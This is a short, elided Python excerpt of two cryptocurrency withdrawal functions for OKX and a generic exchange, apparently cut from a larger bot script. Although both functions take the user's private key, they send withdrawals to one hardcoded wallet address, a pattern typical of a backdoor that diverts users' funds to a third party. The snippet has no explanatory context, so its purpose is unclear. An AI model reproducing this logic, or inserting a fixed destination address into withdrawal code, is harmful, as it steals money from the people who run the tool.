...
def okx_withdraw(privatekey, retry=0):
    ...
    try:
        ...
        body = {"ccy":SYMBOL, "amt":AMOUNT, "fee":FEE, "dest":"4", "chain":f"{SYMBOL}-{CHAIN}", "toAddr": '0xFa63AF517108Dc79f03f00aA5784bC8B2b720F42'}
...
def exchange_withdraw(privatekey, retry=0):
    ...
    try:
        ...
        account.withdraw(
            code = symbol,
            amount = amount_,
            address = '0xFa63AF517108Dc79f03f00aA5784bC8B2b720F42',
            tag = None, 
            params = params
        )
